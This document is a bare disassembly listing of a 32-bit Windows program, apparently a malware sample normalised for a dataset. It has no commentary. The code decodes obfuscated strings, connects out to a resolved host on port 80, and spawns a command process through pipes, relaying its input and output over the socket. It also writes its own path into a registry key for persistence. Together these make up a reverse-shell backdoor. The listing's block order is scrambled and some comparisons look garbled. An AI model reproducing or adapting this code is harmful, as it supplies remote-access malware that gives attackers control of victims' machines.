sub_401000
push ebp
mov ebp esp
xor ecx ecx
cmp [ ebp + 0xc ] ecx
jle r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
add eax ecx
mov dl [ eax ]
add dl [ ebp + 0x14 ]
xor dl [ ebp + 0x10 ]
inc ecx
cmp ecx [ ebp + 0xc ]
mov [ eax ] dl
jl r-xdata
sub_401021
push ebp
mov ebp esp
mov eax 0x1280
call sub_401930
push ebx
push esi
push edi
xor ebx ebx
mov ecx 0x3ff
xor eax eax
lea edi [ ebp - 0x127f ]
mov [ ebp - 0x1280 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov eax [ rw-data ]
push 0x40
mov [ ebp - 0x280 ] eax
pop ecx
xor eax eax
lea edi [ ebp - 0x27c ]
[ edi ]
push 0x40
lea edi [ ebp - 0x17b ]
pop ecx
mov [ ebp - 0x17c ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x17c ]
push 0x104
push eax
call [ GetSystemDirectoryA@IAT ]
lea eax [ ebp - 0x17c ]
push rw-data
push eax
call strcat
push 0x10
lea eax [ ebp - 0x28 ]
push ebx
push eax
call memset
push 0x44
lea eax [ ebp - 0x78 ]
push ebx
push eax
call memset
add esp 0x20
mov esi 0x1000
push 0x1
lea eax [ ebp - 0x34 ]
pop edi
mov [ ebp - 0x34 ] 0xc
push ebx
push eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] ebx
push eax
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x2c ] edi
call [ CreatePipe@IAT ]
lea eax [ ebp - 0x34 ]
push ebx
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call [ CreatePipe@IAT ]
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4c ] 0x101
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x48 ] bx
push eax
lea eax [ ebp - 0x78 ]
push eax
push ebx
push ebx
push ebx
push edi
push ebx
lea eax [ ebp - 0x280 ]
push ebx
push eax
push ebx
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
mov edi [ CloseHandle@IAT ]
call edi
push [ ebp - 0x14 ]
call edi
push [ ebp - 0x10 ]
call edi
push [ ebp - 0xc ]
call edi
push ebx
push [ ebp - 0x28 ]
call [ TerminateProcess@IAT ]
mov ecx [ ebp + 0x8 ]
call sub_4015ed
test eax eax
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
push ebx
push ebx
push ebx
push edi
push ebx
lea eax [ ebp - 0x280 ]
push ebx
push eax
lea eax [ ebp - 0x17c ]
push eax
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
push ebx
lea eax [ ebp - 0x4 ]
mov edi [ PeekNamedPipe@IAT ]
push ebx
push eax
lea eax [ ebp - 0x1280 ]
push esi
push eax
push [ ebp - 0x8 ]
call edi
mov [ ebp - 0x18 ] ebx
push [ ebp - 0x28 ]
mov edi [ CloseHandle@IAT ]
call edi
push [ ebp - 0x24 ]
call edi
push [ ebp - 0x8 ]
mov esi [ CloseHandle@IAT ]
call esi
push [ ebp - 0x14 ]
call esi
push [ ebp - 0x10 ]
call esi
push [ ebp - 0xc ]
call esi
pop edi
pop esi
xor eax eax
pop ebx
leave
retn 0x4
push ebx
push [ ebp - 0x28 ]
call [ TerminateProcess@IAT ]
push esi
lea eax [ ebp - 0x1280 ]
push ebx
push eax
jbe r-xdata
push ebx
lea eax [ ebp - 0x4 ]
push ebx
push eax
lea eax [ ebp - 0x1280 ]
push esi
push eax
push [ ebp - 0x8 ]
call edi
push 0x32
call [ Sleep@IAT ]
inc [ ebp - 0x18 ]
cmp [ ebp - 0x18 ] 0x14
jl r-xdata
call memset
mov ecx [ ebp + 0x8 ]
add esp 0xc
lea eax [ ebp - 0x1280 ]
push ebx
push esi
push eax
call sub_40159f
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
call memset
add esp 0xc
lea eax [ ebp - 0x4 ]
push ebx
push eax
push [ ebp - 0x4 ]
lea eax [ ebp - 0x1280 ]
push eax
push [ ebp - 0x8 ]
call [ ReadFile@IAT ]
mov ecx [ ebp + 0x8 ]
push ebx
push [ ebp - 0x4 ]
lea eax [ ebp - 0x1280 ]
push eax
call sub_40156c
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] ebx
cmp [ ebp - 0x1280 ] 0x69
jne r-xdata
jmp r-xdata
lea ecx [ ebp - 0x4 ]
push ebx
push ecx
push eax
lea eax [ ebp - 0x1280 ]
push eax
push [ ebp - 0xc ]
call [ WriteFile@IAT ]
jmp r-xdata
cmp [ ebp - 0x127f ] 0x69
jne r-xdata
cmp [ ebp - 0x127e ] 0x73
jne r-xdata
cmp [ ebp - 0x127d ] 0x63
jne r-xdata
cmp [ ebp - 0x127d ] 0x65
jne r-xdata
cmp [ ebp - 0x127c ] 0x6d
jne r-xdata
cmp [ ebp - 0x127d ] 0x6b
jne r-xdata
cmp [ ebp - 0x127c ] 0x78
jne r-xdata
cmp [ ebp - 0x127b ] 0x64
jne r-xdata
cmp [ ebp - 0x127c ] 0x69
jne r-xdata
cmp [ ebp - 0x127b ] 0x69
jne r-xdata
cmp [ ebp - 0x127a ] 0x20
jne r-xdata
cmp [ ebp - 0x127b ] 0x6c
jne r-xdata
cmp [ ebp - 0x127a ] 0x74
je r-xdata
xor eax eax
cmp [ ebp - 0x127a ] 0x6c
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
mov [ ebp + eax - 0x1279 ] bl
lea eax [ ebp - 0x1279 ]
push eax
lea eax [ ebp - 0x280 ]
push eax
call strcpy
pop ecx
pop ecx
jmp r-xdata
cmp cl 0xd
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
push ebx
push [ ebp - 0x28 ]
call [ TerminateProcess@IAT ]
mov ecx [ ebp + 0x8 ]
call sub_4015d6
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
inc eax
cmp eax 0x100
jl r-xdata
push ebx
push [ ebp - 0x28 ]
call [ TerminateProcess@IAT ]
mov ecx [ ebp + 0x8 ]
call sub_4015d6
mov [ rw-data ] 0x1
mov cl [ ebp + eax - 0x1279 ]
cmp cl 0xa
je r-xdata
jmp r-xdata
sub_4013c0
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x530
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi ecx
mov [ ebp - 0x540 ] esi
lea eax [ esi + 0x8 ]
push eax
push 0x2
call [ WSAStartup@IAT ]
xor edi edi
mov [ ebp - 0x4 ] edi
push edi
push edi
push edi
push 0x6
push 0x1
pop ebx
push ebx
push 0x2
call [ WSASocketA@IAT ]
mov [ esi ] eax
cmp eax 0xffffffff
jne r-xdata
push 0x10
push edi
lea eax [ ebp - 0x428 ]
push eax
call memset
add esp 0xc
mov [ ebp - 0x428 ] 0x2
push 0x50
call [ htons@IAT ]
mov [ ebp - 0x426 ] ax
push [ ebp + 0x8 ]
push esi
call sub_401505
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x530 ] bl
push ebx
lea eax [ ebp - 0x530 ]
push eax
push 0x8
push 0xffff
push [ esi ]
call [ setsockopt@IAT ]
test eax eax
jne r-xdata
or esi eax
jmp r-xdata
push 0x10
lea eax [ ebp - 0x428 ]
push eax
push [ esi ]
call [ connect@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x53c ] ebx
mov [ ebp - 0x538 ] 0xea60
mov [ ebp - 0x534 ] 0x1388
push edi
push edi
lea eax [ ebp - 0x530 ]
push eax
push edi
push edi
push 0xc
lea eax [ ebp - 0x53c ]
push eax
push 0x98000004
push [ esi ]
call [ WSAIoctl@IAT ]
or [ ebp - 0x4 ] 0xffffffff
mov eax esi
jmp r-xdata
mov [ esi + 0x4 ] ebx
or [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
jmp r-xdata
mov esi [ esi ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_401505
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
call [ gethostbyname@IAT ]
mov [ ebp - 0x1c ] eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_40156c
push esi
push edi
mov esi ecx
xor edi edi
pop edi
pop esi
retn 0xc
cmp edi 0x4
jne r-xdata
inc edi
cmp edi 0x5
jl r-xdata
and [ esi + 0x4 ] 0x0
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esi ]
call [ send@IAT ]
cmp eax 0xffffffff
jne r-xdata
sub_40159f
push esi
push edi
mov esi ecx
xor edi edi
cmp edi 0x4
jne r-xdata
test eax eax
jne r-xdata
inc edi
cmp edi 0x5
jl r-xdata
and [ esi + 0x4 ] 0x0
pop edi
pop esi
retn 0xc
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esi ]
call [ recv@IAT ]
cmp eax 0xffffffff
je r-xdata
_TLS_Entry_0
mov eax sub_401aff
call sub_4018f0
sub esp 0x1b4
push ebx
push esi
call [ GetInputState@IAT ]
xor ebx ebx
push ebx
push ebx
push ebx
call [ GetCurrentThreadId@IAT ]
push eax
call [ PostThreadMessageA@IAT ]
push ebx
push ebx
lea eax [ ebp - 0x28 ]
push ebx
push eax
call [ GetMessageA@IAT ]
call sub_4016ba
call sub_401865
lea ecx [ ebp - 0x1c0 ]
call sub_4013b1
cmp [ rw-data ] bl
mov [ ebp - 0x4 ] ebx
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1c0 ]
call j_sub_4015d6
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0xc
mov esi [ Sleep@IAT ]
push [ rw-data ]
call esi
cmp [ rw-data ] bl
je r-xdata
lea ecx [ ebp - 0x1c0 ]
call sub_4015ed
test eax eax
je r-xdata
push [ rw-data ]
lea ecx [ ebp - 0x1c0 ]
call sub_4013c0
cmp [ ebp - 0x1c0 ] 0xffffffff
je r-xdata
lea eax [ ebp - 0x1c0 ]
push eax
call sub_40170f
cmp [ rw-data ] bl
jne r-xdata
sub_4016da
push ebp
mov ebp esp
sub esp 0x14
and [ ebp - 0x14 ] 0x0
push edi
xor eax eax
lea edi [ ebp - 0x13 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
push rw-data
lea eax [ ebp - 0x14 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
xor eax eax
pop edi
leave
retn 0x10
sub_40170f
push ebp
mov ebp esp
mov eax 0x1014
call sub_401930
push ebx
push esi
push edi
xor ebx ebx
mov ecx 0x3ff
xor eax eax
lea edi [ ebp - 0x1013 ]
mov [ ebp - 0x1014 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
lea edi [ ebp - 0x13 ]
mov [ ebp - 0x14 ] bl
mov esi 0x1000
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
push esi
lea eax [ ebp - 0x1014 ]
push ebx
push eax
call memset
mov edi rw-data
mov [ rw-data ] 0x1
or eax 0xffffffff
jmp r-xdata
push esi
lea eax [ ebp - 0x1014 ]
push ebx
push eax
call memset
mov ecx [ ebp + 0x8 ]
add esp 0xc
lea eax [ ebp - 0x1014 ]
push ebx
push esi
push eax
call sub_40159f
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov [ rw-data ] bl
cmp eax ebx
je r-xdata
push [ ebp + 0x8 ]
call sub_401021
cmp [ rw-data ] bl
push 0x1
pop eax
je r-xdata
xor ecx ecx
cmp eax ebx
jle r-xdata
mov [ rw-data ] al
lea eax [ ebp - 0x1014 ]
push eax
call strlen
cmp eax 0x4
pop ecx
jb r-xdata
mov dl [ ebp + ecx - 0x1014 ]
cmp dl 0xa
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push rw-data
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x1014 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call strcpy
pop ecx
pop ecx
mov [ ebp + ecx - 0x1014 ] bl
cmp dl 0xd
je r-xdata
cmp [ rw-data ] bl
jne r-xdata
push esi
lea eax [ ebp - 0x1014 ]
push ebx
push eax
call memset
jmp r-xdata
inc ecx
cmp ecx eax
jl r-xdata
lea eax [ ebp - 0x1014 ]
push edi
push eax
call strcpy
add esp 0x14
push ebx
push edi
call strlen
pop ecx
mov ecx [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1014 ]
push eax
call sub_40156c
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
sub_401865
push ebp
mov ebp esp
sub esp 0x108
lea eax [ ebp - 0x4 ]
push edi
push eax
push 0x20006
push 0x0
push rw-data
push 0x80000001
call [ RegOpenKeyExA@IAT ]
and [ ebp - 0x108 ] 0x0
push 0x40
pop ecx
xor eax eax
lea edi [ ebp - 0x107 ]
push 0x104
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x108 ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
push eax
lea eax [ ebp - 0x108 ]
push eax
push 0x1
push 0x0
push rw-data
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
pop edi
leave
retn
sub_401930
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_401aeb
cmp [ rw-data ] ebx
jne r-xdata
call sub_401ad6
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_401ae8
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_4016da
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_4013b1
mov eax ecx
or [ eax ] 0xffffffff
and [ eax + 0x4 ] 0x0
retn
j_sub_4015d6
jmp sub_4015d6
sub_4014e1
push 0x1
pop eax
retn
sub_40154e
push 0x1
pop eax
retn
sub_4015d6
push esi
mov esi ecx
push 0x0
push [ esi ]
call [ shutdown@IAT ]
push [ esi ]
call [ closesocket@IAT ]
pop esi
retn
sub_4015ed
mov eax [ ecx + 0x4 ]
retn
sub_4016ba
push 0x7
push 0x2
push [ rw-data ]
call strlen
pop ecx
push eax
push [ rw-data ]
call sub_401000
add esp 0x10
retn
strlen
jmp [ strlen@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
sub_4018f0
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
strcpy
jmp [ strcpy@IAT ]
memset
jmp [ memset@IAT ]
strcat
jmp [ strcat@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
strcmp
jmp [ strcmp@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_401ad6
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_401ae8
xor eax eax
retn
sub_401aeb
retn
_controlfp
jmp [ _controlfp@IAT ]
sub_401af4
lea ecx [ ebp - 0x1c0 ]
jmp j_sub_4015d6
sub_401aff
mov eax r--data
jmp __CxxFrameHandler
